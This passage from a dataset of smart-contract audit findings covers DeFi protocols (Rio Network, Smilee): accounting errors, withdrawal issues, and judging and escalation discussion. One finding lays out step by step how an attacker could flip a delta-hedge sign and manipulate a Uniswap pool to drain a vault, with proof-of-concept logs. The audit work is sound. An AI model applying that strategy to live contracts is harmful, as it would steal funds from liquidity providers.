sload(ethQueuedForUserSettlementGwei.slot)\n        }\n\n        uint64 userSettlementGwei = uint64(ethQueuedSlotData);\n        uint64 operatorExitAndScrapeGwei = uint64(ethQueuedSlotData  64);\n\n        return (userSettlementGwei + operatorExitAndScrapeGwei).toWei();\n    }\n\n    function getETHUnderManagement() external view returns (uint256) {\n        int256 aum = getEigenPodShares() + int256(getETHQueuedForWithdrawal());\n        if (aum < 0) return 0;\n\n        return uint256(aum);\n    }\n```\n\nSince the operator has eigen pod shares, the TVL will account it aswell. However, since the operator is not actively participating on ether deposits (not in the heap order) the withdrawals or deposits to this specific operator is impossible. Hence, the TVL is accounting an operators eigen pod share which the contract assumes that it is not in the heap.\nTextual PoC: Assume there are 5 operators whereas only 4 of these operators are actively participating in BEACON_CHAIN_STRATEGY which means that 1 operator has no validator caps set hence, it is not in the heap order. However, this operator can still have ether deposits and can verify them. Since the TVL accounting loops over all the operators but not the operators that are actively participating in beacon chain strategy, the TVL calculated will be wrong."чput a check on `verifyWithdrawalCredentials` that is not possible to call the function if the operator is not actively participating in the BEACON_CHAIN_STRATEGY.\nDiscussion\nsolimander\nThis is a necessary feature, and should be a short-lived quirk. If an operator is deactivated prior to all validator withdrawal credentials being proven, they will need to prove the credentials and withdraw after deactivation, which would then be scraped back into the deposit pool.\nnevillehuang\nI believe this should have been a known consideration stated in the contest details, so leaving as medium severity.чMiscalculation of total ether holdings of an LRT. Withdrawals can fail because the calculated ether is not existed in the heap but the TVL says there are ether to withdraw from the LRT.\nCode Snippet\nTool used\nManual Review
`requestWithdrawal` doesn't estimate accurately the available shares for withdrawalsчmediumч```\nuint256 availableShares = assetRegistry().convertToSharesFromAsset(asset, assetRegistry().getTotalBalanceForAsset(asset));\n```\nчThe `requestWithdrawal` function inaccurately estimates the available shares for withdrawals by including funds stored in the deposit pool into the already deposited EigenLayer shares. This can potentially lead to blocking withdrawals or users receiving less funds for their shares.\nFor a user to withdraw funds from the protocol, they must first request a withdrawal using the `requestWithdrawal` function, which queues the withdrawal in the current epoch by calling `withdrawalQueue().queueWithdrawal`.\nTo evaluate the available shares for withdrawal, the function converts the protocol asset balance into shares:\n```\nuint256 availableShares = assetRegistry().convertToSharesFromAsset(asset, assetRegistry().getTotalBalanceForAsset(asset));\n```\n\nThe issue arises from the `getTotalBalanceForAsset` function, which returns the sum of the protocol asset funds held, including assets already deposited into EigenLayer and assets still in the deposit pool:\n```\nfunction getTotalBalanceForAsset(\n    address asset\n) public view returns (uint256) {\n    if (!isSupportedAsset(asset)) revert ASSET_NOT_SUPPORTED(asset);\n\n    address depositPool_ = address(depositPool());\n    if (asset == ETH_ADDRESS) {\n        return depositPool_.balance + getETHBalanceInEigenLayer();\n    }\n\n    uint256 sharesHeld = getAssetSharesHeld(asset);\n    uint256 tokensInRio = IERC20(asset).balanceOf(depositPool_);\n    uint256 tokensInEigenLayer = convertFromSharesToAsset(\n        getAssetStrategy(asset),\n        sharesHeld\n    );\n\n    return tokensInRio + tokensInEigenLayer;\n}\n```\n\nThis causes the calculated `availableShares` to differ from the actual shares held by the protocol because the assets still in the deposit pool shouldn't be converted to shares with the current share price (shares/asset) as they were not deposited into EigenLayer yet.\nDepending on the current shares price, the function might over or under-estimate the available shares in the protocol. This can potentially result in allowing more queued withdrawals than the available shares in the protocol, leading to blocking withdrawals later on or users receiving less funds for their shares.чThere is no straightforward way to handle this issue as the asset held by the deposit pool can't be converted into shares while they were not deposited into EigenLayer. The code should be reviewed to address this issue.\nDiscussion\nsolimander\nDuplicate of https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/109чThe `requestWithdrawal` function inaccurately estimates the available shares for withdrawals, potentially resulting in blocking withdrawals or users receiving less funds for their shares.\nCode Snippet\nTool used\nManual Review
Slashing penalty is unfairly paid by a subset of users if a deficit is accumulated.чmediumч```\n        uint256 balanceBefore = asset.getSelfBalance();\n\n        address[] memory assets = asset.toArray();\n        bytes32[] memory roots = new bytes32[](queuedWithdrawalCount);\n\n        IDelegationManager.Withdrawal memory queuedWithdrawal;\n        for (uint256 i; i < queuedWithdrawalCount; ++i) {\n            queuedWithdrawal = queuedWithdrawals[i];\n\n            roots[i] = _computeWithdrawalRoot(queuedWithdrawal);\n            delegationManager.completeQueuedWithdrawal(queuedWithdrawal, assets, middlewareTimesIndexes[i], true);\n\n            // Decrease the amount of ETH queued for withdrawal. We do not need to validate the staker as\n            // the aggregate root will be validated below.\n            if (asset == ETH_ADDRESS) {\n                IRioLRTOperatorDelegator(queuedWithdrawal.staker).decreaseETHQueuedForUserSettlement(\n                    queuedWithdrawal.shares[0]\n                );\n            }\n        }\n        if (epochWithdrawals.aggregateRoot != keccak256(abi.encode(roots))) {\n            revert INVALID_AGGREGATE_WITHDRAWAL_ROOT();\n        }\n        epochWithdrawals.shareValueOfAssetsReceived = SafeCast.toUint120(epochWithdrawals.sharesOwed);\n\n        uint256 assetsReceived = asset.getSelfBalance() - balanceBefore;\n        epochWithdrawals.assetsReceived += SafeCast.toUint120(assetsReceived);\n```\nчIf a deficit is accumulated in the EigenPodManager due to slashing when ETH is being withdrawn the slashing payment will be taken from the first cohort to complete a withdrawal.\nA deficit can happen in `podOwnerShares[podOwner]` in the EigenPodManager in the EigenLayer protocol. This can happen if validators are slashed when ETH is queued for withdrawal.\nThe issue is that this deficit will be paid for by the next cohort to complete a withdrawal by calling `settleEpochFromEigenLayer()`.\nIn the following code we can see how `epochWithdrawals.assetsReceived` is calculated based on the amount received from the `delegationManager.completeQueuedWithdrawal` call\n```\n        uint256 balanceBefore = asset.getSelfBalance();\n\n        address[] memory assets = asset.toArray();\n        bytes32[] memory roots = new bytes32[](queuedWithdrawalCount);\n\n        IDelegationManager.Withdrawal memory queuedWithdrawal;\n        for (uint256 i; i < queuedWithdrawalCount; ++i) {\n            queuedWithdrawal = queuedWithdrawals[i];\n\n            roots[i] = _computeWithdrawalRoot(queuedWithdrawal);\n            delegationManager.completeQueuedWithdrawal(queuedWithdrawal, assets, middlewareTimesIndexes[i], true);\n\n            // Decrease the amount of ETH queued for withdrawal. We do not need to validate the staker as\n            // the aggregate root will be validated below.\n            if (asset == ETH_ADDRESS) {\n                IRioLRTOperatorDelegator(queuedWithdrawal.staker).decreaseETHQueuedForUserSettlement(\n                    queuedWithdrawal.shares[0]\n                );\n            }\n        }\n        if (epochWithdrawals.aggregateRoot != keccak256(abi.encode(roots))) {\n            revert INVALID_AGGREGATE_WITHDRAWAL_ROOT();\n        }\n        epochWithdrawals.shareValueOfAssetsReceived = SafeCast.toUint120(epochWithdrawals.sharesOwed);\n\n        uint256 assetsReceived = asset.getSelfBalance() - balanceBefore;\n        epochWithdrawals.assetsReceived += SafeCast.toUint120(assetsReceived);\n```\n\nthe amount received could be 0 if the deficit is larger than the amount queued for this cohort. See following code in `withdrawSharesAsTokens()` EigenPodManager\n```\n            } else {\n                podOwnerShares[podOwner] += int256(shares);\n                emit PodSharesUpdated(podOwner, int256(shares));\n                return;\n            }\n```\n\nThese users will pay for all slashing penalties instead of it being spread out among all LRT holders.чA potential solution to deal with this is to check if a deficit exists in `settleEpochFromEigenLayer()`. If it exists functionality has to be added that spreads the cost of the penalty fairly among all LRT holders.\nDiscussion\nnevillehuang\nrequest poc\nsherlock-admin3\nPoC requested from @0xmonrel\nRequests remaining: 16\n0xmonrel\nFor this POC to run we need to first fix the epoch increment issue. Done by adding `currentEpochsByAsset[asset] += 1;` to queueCurrentEpcohSettlement().\nPOC\nThis shows that users in the first withdrawal pay for 100% of the penalty if we have a deficit due to slashing\nCourse of events\nDeposit such that we have 2 validators\nRequest withdrawal 8 ETH and rebalance for epoch 0\nRequest withdrawal 31.99 ETH and rebalance for epoch 1\nSlashing during withdrawal period such that we have a -8 ETH deficit in the EigenpodManager\nVerifyAndProcess both withdrawals\nSettle and claim epoch 0, we get 0 ETH since penalty is paid for 100% by these users.\nSettle and claim epoch 1, we get 31.99 ETH since 0% of penalty is paid for.\nUsers in epoch 1 has stolen 4 ETH from users in epoch 0.\nResults\n```\nLogs:\n  Total shares after deposit: 64000000000000000000\n  Slashing 8 Ether during withdrawal process, deficit in shares: -8000000000000000000\n  First Withdrawal: 0\n  Second Withdrawal: 31990000000000000000\n  Users in first withdrawal paid for 100% of penalty\n```\n\nnevillehuang\n@solimander Might want to consider the above PoC\nsolimander\nReviewing\nKupiaSecAdmin\nEscalate\nThis has to be considered as Invalid/Low basically because EigenLayer's Slashing contracts do not have any features and all paused, it also won't have any features in its upgrades as well, which means no slashing exists.\nsherlock-admin2\nEscalate\nThis has to be considered as Invalid/Low basically because EigenLayer's Slashing contracts do not have any features and all paused, it also won't have any features in its upgrades as well, which means no slashing exists.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n0xmonrel\nYou are misunderstanding the issue. This is about consensus layer slashing.\nnevillehuang\n@KupiaSecAdmin Could you link resources/proof to your argument so I can review?\nKupiaSecAdmin\n@nevillehuang - https://hackmd.io/@-HV50kYcRqOjl_7du8m1AA/BkOyFwc2T#Out-of-Scope Here's the docs about upgrades of EigenLayer, which Rio is targeting, hope it helps.\n@0xmonrel - If you were meant to say about Ethereum's PoS slashing, as I described here, it should be considered as Low.\n0xmonrel\nThe arguments does not apply here. The effect on TVL are irrelevant what matters in this issue is that only 1 cohort of users will pay for the slashing if a deficit happens.\nnevillehuang\n@solimander Based on targeted eigen layer contracts it seems it is correct that slashing is currently not applicable to Rio. It is also not stated in the contest details that this will be integrated to rio, so I believe this is invalid based on the following sherlock guideline:\nFuture issues: Issues that result out of a future integration/implementation that was not mentioned in the docs/README or because of a future change in the code (as a fix to another issue) are not valid issues.\n0xmonrel\nPOS slashing is already live and integrated. Slashing from re-staking is not so it is not out of scope.\nnevillehuang\n@0xmonrel Could you point me to the correct resource. This will affect validity of #190 as well\n0xmonrel\nSlashing is implemented natively through the balance update process. When a validator is slashed the balance is decreased, this is then pushed to EigenLayer through `verifyBalanceUpdates()`.\nHere is the logic where slashing is accounted for and a deficit can happen:\nLook here at the `verifyBalanceUpdates()`\nRead the comment for a description of what happens when a balance is decreased.\n@solimander can most likely verify that this is correct as he has deep understanding of EigenLayer.\nsolimander\nThat's right, you can find more info on the deficit edge case in the EigenLayer discord:\nnevillehuang\nThanks alot guys, I believe this issue is correctly judged given the constraint of a deficit edge case.\nCzar102\nI'm planning to reject the escalation and leave the issue as is, unless @KupiaSecAdmin or anyone else has a valid argument not to.\nCzar102\nResult: Medium Unique\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nKupiaSecAdmin: rejected\nsolimander\nThis is definitely an edge case of an edge case. First, slashing needs to occur while the withdrawal is queued. Second, the operator delegator's pod owner shares needs to be low enough that a deficit is possible. For this reason, considering leaving as-is for now and handling this out-of-protocol.чIf a deficit is accumulated the first cohort to settle will pay for the entire amount. If they can not cover it fully, they will receive 0 and the following cohort will pay for the rest.\nCode Snippet\nTool used\nManual Review
ETH withdrawers do not earn yield while waiting for a withdrawalчmediumч```\nsharesOwed = convertToSharesFromRestakingTokens(asset, amountIn);\n```\nч"In the Rio doc we can read the following\n""Users will continue to earn yield as they wait for their withdrawal request to be processed.""\nThis is not true for withdrawals in ETH since they will simply receive an equivalent to the `sharesOWed` calculated when requesting a withdrawal.\nWhen `requestWithdrawal()` is called to withdraw ETH `sharesOwed` is calculated\n```\nsharesOwed = convertToSharesFromRestakingTokens(asset, amountIn);\n```\n\nThe total `sharesOwed` in ETH is added to `epcohWithdrawals.assetsReceived` if we settle with `settleCurrentEpoch()` or `settleEpochFromEigenlayer()`\nBelow are the places where `assetsReceived` is is set and accumulated\n```\nepochWithdrawals.assetsReceived = SafeCast.toUint120(assetsReceived);\n```\n\n```\nepochWithdrawals.assetsReceived = SafeCast.toUint120(assetsReceived); \n```\n\n```\nepochWithdrawals.assetsReceived += SafeCast.toUint120(assetsReceived);\n```\n\nwhen claiming rewards this is used to calculate users share\n```\namountOut = userSummary.sharesOwed.mulDiv(epochWithdrawals.assetsReceived, epochWithdrawals.sharesOwed);\n```\n\nThe portion of staking rewards accumulated during withdrawal that belongs to LRT holders is never accounted for so withdrawing users do not earn any rewards when waiting for a withdrawal to be completed."ч"Account for the accumulate rewards during the withdrawal period that belongs to the deposit pool. This can be calculated based on data in DelayedWithdrawalRouter on Eigenlayer.\nDiscussion\n0xmonrel\nEscalate\nI will argue that this should be a separate High issue\nThis is not a duplicate of #109. This is an entirely different issue. What I show here is that ETH is the only asset that does not earn yield during withdrawal. The documentation clearly states that users earn yield when withdrawing:\nFrom Rio doc ""Users will continue to earn yield as they wait for their withdrawal request to be processed.""\nWe should also consider that the time to withdrawal ETH can be longer than the EigenLayer withdrawal period depending on how many other validators are exiting.\nHere is the time depending on how many validators are exiting\nsource\nIf there is a large outflow of exiting validators it could take weeks to even receive the withdrawal status.\nEvery single user that withdrawals in ETH lose the yield that they are promised and would have received if they had withdrawn in another asset.\nI believe this fulfills the following criteria for a High ""Definite loss of funds without (extensive) limitations of external conditions.""\nsherlock-admin2\nEscalate\nI will argue that this should be a separate High issue\nThis is not a duplicate of #109. This is an entirely different issue. What I show here is that ETH is the only asset that does not earn yield during withdrawal. The documentation clearly states that users earn yield when withdrawing:\nFrom Rio doc ""Users will continue to earn yield as they wait for their withdrawal request to be processed.""\nWe should also consider that the time to withdrawal ETH can be longer than the EigenLayer withdrawal period depending on how many other validators are exiting.\nHere is the time depending on how many validators are exiting\nsource\nIf there is a large outflow of exiting validators it could take weeks to even receive the withdrawal status.\nEvery single user that withdrawals in ETH lose the yield that they are promised and would have received if they had withdrawn in another asset.\nI believe this fulfills the following criteria for a High ""Definite loss of funds without (extensive) limitations of external conditions.""\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nsolimander\nTechnically valid, but would argue the loss is highly constrained in that the only loss is yield while withdrawing. I'll update the docs for this issue.\nnevillehuang\nI believe #177 and #367 to be duplicates of this issue\n0xmonrel\n#177 is not a duplicate it is about rebasing tokens. #367 is definitely a duplicate.\nnevillehuang\n@solimander I am still unsure if this is not a duplicate of #109 and others. Could you elaborate more and is a separate fix required? The following impact highlighted by the watson seems to indicate otherwise. To me it seems like the same accrual inconsistency due to exchange rate used to compute sharesOwed regardless of type of asset.\nThe portion of staking rewards accumulated during withdrawal that belongs to LRT holders is never accounted for so withdrawing users do not earn any rewards when waiting for a withdrawal to be completed.\nsolimander\n@nevillehuang The issues do seem slightly different, though the fix being considered will fully fix #109 and partially fix this issue.\nThe core issue in #109 is that there's a period between the time that the shares owed is locked and the rebalance occurs in which yield to the EigenLayer strategy can cause a rebalance revert.\nLocking shares owed at the time of withdrawal request also affects this issue in that it prevents withdrawals from earning yield at the time the withdrawal request is received. Once a rebalance occurs, this issue has a secondary cause that prevents yield from being earned - unlike other strategies, ""shares"" in the beacon chain strategy are just ETH, so no additional yield can be earned once the withdrawal from EigenLayer is queued.\nI plan to address both with the above fix and update the docs to inform users that yield will only be earned between the time of withdrawal request and rebalance for ETH withdrawals.\n0xmonrel\n@solimander I am still unsure if this is not a duplicate of #109 and others. Could you elaborate more and is a separate fix required? The following impact highlighted by the watson seems to indicate otherwise. To me it seems like the same accrual inconsistency due to exchange rate used to compute sharesOwed regardless of type of asset.\nThe portion of staking rewards accumulated during withdrawal that belongs to LRT holders is never accounted for so withdrawing users do not earn any rewards when waiting for a withdrawal to be completed.\nNo, that issue does not fix this one. This issue can be fixed in protocol but it would require quite a bit of added complexity to account for the correct share of yield. Solimander will instead settle on not giving out yield during the withdrawal process, which of course users needs to be aware of.\n@solimander have you considered that the withdrawal of ETH could take weeks or months if the POS withdrawal queue is congested? I just want to confirm that we have covered everything here.\nMaybe we can add functionality to compensate users that have their assets locked for a long period of time without earning yield. E.g. if POS withdrawal takes 2 week more than the EigenLayer withdrawal the admin can issue 0-5% APY equivalent amount of yield to the cohort from the deposit pool.\nJust brainstorming on a fix that does not add a lot of complexity but defends against the worst case scenario..\n\nActually, I think there is reasonable fix that solves all this in protocol. It requires that an Oracle is used to update the cumulative yield in a single storage slot when rebalance is called. We also need to add a mapping `epoch->time` and then let ETH withdrawers take their yield directly from the deposit pool at the time of withdrawal.\nSolimander, I can provide an MVP for the above if you are interested.\nnevillehuang\nLocking shares owed at the time of withdrawal request also affects this issue in that it prevents withdrawals from earning yield at the time the withdrawal request is received. Once a rebalance occurs, this issue has a secondary cause that prevents yield from being earned - unlike other strategies, ""shares"" in the beacon chain strategy are just ETH, so no additional yield can be earned once the withdrawal from EigenLayer is queued.\nThe secondary cause seems to not be highlighted in the original submission. I believe they are duplicates because both issues point to locking of assets (albeit different assets) within deposit pools and locking the exchange rate during deposits. I believe if exchange rate accounts for yield accrued that is supposed to be delegated to the user, both issues would be solved.\n0xmonrel\nLocking shares owed at the time of withdrawal request also affects this issue in that it prevents withdrawals from earning yield at the time the withdrawal request is received. Once a rebalance occurs, this issue has a secondary cause that prevents yield from being earned - unlike other strategies, ""shares"" in the beacon chain strategy are just ETH, so no additional yield can be earned once the withdrawal from EigenLayer is queued.\nThe secondary cause seems to not be highlighted in the original submission. I believe they are duplicates because both issues point to locking of assets (albeit different assets) within deposit pools and locking the exchange rate during deposits. I believe if exchange rate accounts for yield accrued that is supposed to be delegated to the user, both issues would be solved.\nI believe if exchange rate accounts for yield accrued that is supposed to be delegated to users, both issues would be solved\nLST and ETH earn yield differently. This entire issue is on the topic of how ETH yield is not accounted for at all since it is distributed through a separate system that has nothing to do with the exchange rate. The fix to #109 does not lead to users earning yield during the withdrawal period since the yield from rebalance -> completed withdrawal is not accounted for.\nI am clearly referring to the secondary issue:\nThe portion of staking rewards accumulated during withdrawal that belongs to LRT holders is never accounted for so withdrawing users do not earn any rewards when waiting for a withdrawal to be completed.\nCzar102\n@0xmonrel from my understanding, #109 is an issue that makes the LST not earn yield during withdrawals, while this and #367 are documentation issues about the fact that the documentation mentions that the yield is being earned during withdrawal for ETH.\nSuch a mechanic for ETH (described in the docs) would be fundamentally flawed, so I'm not sure how to consider this finding, given that the implementation works as it should, though against the specification.\n@solimander @0xmonrel @nevillehuang do you agree?\n0xmonrel\n@Czar102 I agree with your statement other than ""such a mechanic for ETH would be fundamentally flawed"". Why would it not be possible to account for the ETH yield earned? It might add complexity but it is possible.\nAnd yes, fundamentally the issue is that it is stated that users earn yield during ETH withdrawals but they do not. I am assuming here that users expecting yield based on provided information but not earning any as loss off funds/yield. But its obviously your call to decide if that is a fair assumption.\nnevillehuang\n@Czar102 yea agree with your point for the de-deduplication. Seems like a documentation error if sponsor didn’t fix it, but would be fair to validate it based on information presented at time of audit. I will leave it up to you to decide.\n#367 and #177 seems to be talking about LST though not ETH? How is the yield earned from native ETH different from LST? Also don’t users accept the exchange rate when requesting withdrawals?\nCzar102\nI am referencing a fundamental flaw because ETH does not earn rewards when a validator is in the withdrawal queue. This means that Rio is fundamentally unable to provide staking rewards from that period of being locked if the withdrawal is not to impact other users' rewards.\n@nevillehuang @0xmonrel does that make sense?\nOr is it the same for ETH and other LSTs?\n0xmonrel\nI am referencing a fundamental flaw because ETH does not earn rewards when a validator is in the withdrawal queue. This means that Rio is fundamentally unable to provide staking rewards from that period of being locked if the withdrawal is not to impact other users' rewards.\n@nevillehuang @0xmonrel does that make sense?\nOr is it the same for ETH and other LSTs?\nThat is partially correct. Until the validator gets ""withdrawable"" status it will still be earning yield, i posted a picture of the expected time in a picture above.\nAs it stand the users withdrawing are actually paying all other users the yield that the validator is generating. A user solo staking or using EigenLayer would earn yield up until their validator reaches ""withdrawable status"".\n0xmonrel\n@Czar102 yea agree with your point for the de-deduplication. Seems like a documentation error if sponsor didn’t fix it, but would be fair to validate it based on information presented at time of audit. I will leave it up to you to decide.\n#367 and #177 seems to be talking about LST though not ETH? How is the yield earned from native ETH different from LST? Also don’t users accept the exchange rate when requesting withdrawals?\n#367 Is talking about an LRT (reETH), which is the token received when depositing ETH or an LST into Rio. So the issue is about ETH withdrawals which require users to deposit reETH. It is a little confusing since the name is similar to rETH which is an LST.\nEach reETH can have multiple underlying assets that are supported on EigenLayer. EigenLayer distinguishes between LSTs and ETH since ETH has to be staked with an actual validator - the rewards that are generated here is the yield for ETH. These rewards are distributed through the DelayedWithdrawalRouter contract on EigenLayer. Eventually 90% reaches the deposit pool at which point the yield belongs to reETH holders. None of this is accounted for during withdrawals of ETH, that is why ETH withdrawals earn 0 yield.\nFor LSTs (if they are not rebasing) the yield is earned in the increased value of the token based on how much ETH it can be redeemed for which increases as yield is added.\nOn users accept an exchange rate: Users accept the current value of their reETH when requesting a withdrawal but they are also expected to earn yield on top of that during the withdrawal. For non-rebasing LSTs this happens naturally since the yield is baked into the token. Locking in 10 LST today and receiving 10 LST in 1 week will include the yield. This is not true for ETH which is why no yield is earned.\n#107 is a separate issue that does not talk about ETH withdrawals, it is not a duplicate.\nCzar102\nI agree. Will make this a separate issue with #367 and #177 as duplicates shortly.\n0xmonrel\n#177 should not be a duplicate? It is only on rebasing tokens not earning yield\nExplicitly only talking about non-eth rebasing tokens:"чSince a portion of the staking reward belongs to the LRT holders and since the docs mentions that yield is accumulated while in the queue It is fair to assume that withdrawing users have a proportional claim to the yield.\nAs shown above this is not true, users withdrawing in ETH do no earn any rewards when withdrawing.\nCode Snippet\nTool used\nManual Review\nNot all depositors will be able to withdraw their assets/principal for non-ETH assets.\nCzar102\nI see. I will leave it a duplicate of #109, as it was, which will not change the reward distribution from the scenario where it was invalidated. cc @nevillehuang\nThanks for reminding me to remove #177 from the duplicates @0xmonrel.\nCzar102\nResult: Medium Has Duplicates\nConsidering this a Medium since the loss is constrained to the interest during some of the withdrawal time, which is a small part of the deposits.\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\n0xmonrel: accepted
The sign of delta hedge amount can be reversed by malicious user due to incorrect condition in `FinanceIGDelta.deltaHedgeAmount`чhighч```\n    // due to sqrt computation error, sideTokens to sell may be very few more than available\n    if (SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {\n        if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000) {\n            tokensToSwap = SignedMath.revabs(params.sideTokensAmount, true);\n        }\n    }\n```\nч"When delta hedge amount is calculated after the trade, the final check is to account for sqrt computation error and ensure the exchanged amount of side token doesn't exceed amount of side tokens the vault has. The issue is that this check is incorrect: it compares absolute value of the delta hedge amount, but always sets positive amount of side tokens if the condition is true. If the delta hedge amount is negative, this final check will reverse the sign of the delta hedge amount, messing up the hedged assets the protocol has.\nAs a result, if the price moves significantly before the next delta hedge, protocol might not have enough funds to pay off users due to incorrect hedging. It also allows the user to manipulate underlying uniswap pool, then force the vault to delta hedge large amount at very bad price while trading tiny position of size 1 wei, without paying any fees. Repeating this process, the malicious user can drain/steal all funds from the vault in a very short time.\nThe final check in calculating delta hedge amount in `FinanceIGDelta.deltaHedgeAmount` is:\n```\n    // due to sqrt computation error, sideTokens to sell may be very few more than available\n    if (SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {\n        if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000) {\n            tokensToSwap = SignedMath.revabs(params.sideTokensAmount, true);\n        }\n    }\n```\n\nThe logic is that if due to small computation errors, delta hedge amount (to sell side token) can slightly exceed amount of side tokens the vault has, when in reality it means to just sell all side tokens the vault has, then delta hedge amount should equal to side tokens amount vault has.\nThe issue here is that only positive delta hedge amount means vault has to sell side tokens, while negative amount means it has to buy side tokens. But the condition compares `abs(tokensToSwap)`, meaning that if the delta hedge amount is negative, but in absolute value very close to side tokens amount the vault has, then the condition will also be true, which will set `tokensToSwap` to a positive amount of side tokens, i.e. will reverse the delta hedge amount from `-sideTokens` to `+sideTokens`.\nIt's very easy for malicious user to craft such situation. For example, if current price is significantly greater than strike price, and there are no other open trades, simply buy IG bull options for 50% of the vault amount. Then buy IG bull options for another 50%. The first trade will force the vault to buy ETH for delta hedge, while the second trade will force the vault to sell the same ETH amount instead of buying it. If there are open trades, it's also easy to calculate the correct proportions of the trades to make `delta hedge amount = -side tokens`.\nOnce the vault incorrectly hedges after malicious user's trade, there are multiple bad scenarios which will harm the protocol. For example:\nIf no trade happens for some time and the price increases, the protocol will have no side tokens to hedge, but the bull option buyers will still receive their payoff, leaving vault LPs in a loss, up to a situation when the vault will not have enough funds to even pay the option buyers payoff.\nMalicious user can abuse the vault's incorrect hedge to directly profit from it. After the trade described above, any trade, even 1 wei trade, will make vault re-hedge with the correct hedge amount, which can be a significant amount. Malicious user can abuse it by manipulating the underlying uniswap pool: 2.1. Buy underlying uniswap pool up to the edge of allowed range (say, +1.8% of current price, average price of ETH bought = +0.9% of current price) 2.2. Provide uniswap liquidity in that narrow range (+1.8%..+2.4%) 2.3. Open/close any position in IG with amount = 1 wei (basically paying no fees) -> this forces the vault to delta hedge (buy) large amount of ETH at inflated price ~+2% of the current price. 2.5. Remove uniswap liquidity. 2.6. Sell back in the uniswap pool. 2.7. During the delta hedge, uniswap position will buy ETH (uniswap liquidity will sell ETH) at the average price of +2.1% of the current price, also receiving pool fees. The fees for manipulating the pool and ""closing"" position via providing liquidity will cancel out and overall profit will be: +2.1% - 0.9% = +1.2% of the delta hedge amount.\nThe strategy can be enchanced to optimize the profitability, but the idea should be clear."чThe check should be done only when `tokensToSwap` is positive:\n```\n        // due to sqrt computation error, sideTokens to sell may be very few more than available\n-       if (SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {\n+       if (tokensToSwap > 0 && SignedMath.abs(tokensToSwap) > params.sideTokensAmount) {\n            if (SignedMath.abs(tokensToSwap) - params.sideTokensAmount < params.sideTokensAmount / 10000) {\n                tokensToSwap = SignedMath.revabs(params.sideTokensAmount, true);\n            }\n        }\n```\n\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/dverso/smilee-v2-contracts/commit/a871e4fc503df51ee9846f34363c0d94d02c83a0.\npanprog\nFix review: Fixed\nsherlock-admin4\nThe Lead Senior Watson signed off on the fix.чMalicious user can steal all vault funds, and/or the vault LPs will incur losses higher than uniswap LPs or vault will be unable to payoff the traders due to incorrect hedged amount.\nProof Of Concept\nExecution console:\n```\n  baseToken balance 1000000000000000000\n  sideToken balance 1000000000000000000\n// rest of code\n  premium 0\n  baseToken balance 2090000000000000000\n  sideToken balance 0\n// rest of code\n  premium 25585649987654406\n  baseToken balance 1570585649987654474\n  sideToken balance 499999999999999938\n// rest of code\n  premium 25752512349788475\n  baseToken balance 2141338162337442881\n  sideToken balance 0\n// rest of code\n  premium 0\n  baseToken balance 1051338162337442949\n  sideToken balance 999999999999999938\n// rest of code\n```\n\nNotice:\nFirst trade (amount = 1 wei) settles delta-hedge at current price (1.09): sideToken = 0 because price is just above kB\n2nd trade (buy ig bull amount = 0.5) causes delta-hedge of buying 0.5 side token\n3rd trade (buy ig bull amount = 0.5) causes delta-hedge of selling 0.5 side token (instead of buying 0.5)\nLast trade (amount = 1 wei) causes vault to buy 1 side token for correct delta-hedge (but at 0 fee to user).\nCode Snippet\nTool used\nManual Review
Position Manager providing the wrong strike when storing user's position dataчmediumч```\n    function mint(\n        IPositionManager.MintParams calldata params\n    ) external override returns (uint256 tokenId, uint256 premium) {\n        IDVP dvp = IDVP(params.dvpAddr);\n\n        if (params.tokenId != 0) {\n            tokenId = params.tokenId;\n            ManagedPosition storage position = _positions[tokenId];\n\n            if (ownerOf(tokenId) != msg.sender) {\n                revert NotOwner();\n            }\n            // Check token compatibility:\n            if (position.dvpAddr != params.dvpAddr || position.strike != params.strike) {\n                revert InvalidTokenID();\n            }\n            Epoch memory epoch = dvp.getEpoch();\n            if (position.expiry != epoch.current) {\n                revert PositionExpired();\n            }\n        }\n        if ((params.notionalUp > 0 && params.notionalDown > 0) && (params.notionalUp != params.notionalDown)) {\n            // If amount is a smile, it must be balanced:\n            revert AsymmetricAmount();\n        }\n\n        uint256 obtainedPremium;\n        uint256 fee;\n        (obtainedPremium, fee) = dvp.premium(params.strike, params.notionalUp, params.notionalDown);\n\n        // Transfer premium:\n        // NOTE: The PositionManager is just a middleman between the user and the DVP\n        IERC20 baseToken = IERC20(dvp.baseToken());\n        baseToken.safeTransferFrom(msg.sender, address(this), obtainedPremium);\n\n        // Premium already include fee\n        baseToken.safeApprove(params.dvpAddr, obtainedPremium);\n\n==>     premium = dvp.mint(\n            address(this),\n            params.strike,\n            params.notionalUp,\n            params.notionalDown,\n            params.expectedPremium,\n            params.maxSlippage,\n            params.nftAccessTokenId\n        );\n\n        // // rest of code.\n    }\n```\nч"When users mint position using `PositionManager`, users can provide strike that want to be used for the trade. However, if the provided strike data is not exactly the same with IG's current strike, the minted position's will be permanently stuck inside the PositionManager's contract.\nWhen `mint` is called inside `PositionManager`, it will calculate the premium, transfer the required base token, and eventually call `dvp.mint`, providing the user's provided information.\n```\n    function mint(\n        IPositionManager.MintParams calldata params\n    ) external override returns (uint256 tokenId, uint256 premium) {\n        IDVP dvp = IDVP(params.dvpAddr);\n\n        if (params.tokenId != 0) {\n            tokenId = params.tokenId;\n            ManagedPosition storage position = _positions[tokenId];\n\n            if (ownerOf(tokenId) != msg.sender) {\n                revert NotOwner();\n            }\n            // Check token compatibility:\n            if (position.dvpAddr != params.dvpAddr || position.strike != params.strike) {\n                revert InvalidTokenID();\n            }\n            Epoch memory epoch = dvp.getEpoch();\n            if (position.expiry != epoch.current) {\n                revert PositionExpired();\n            }\n        }\n        if ((params.notionalUp > 0 && params.notionalDown > 0) && (params.notionalUp != params.notionalDown)) {\n            // If amount is a smile, it must be balanced:\n            revert AsymmetricAmount();\n        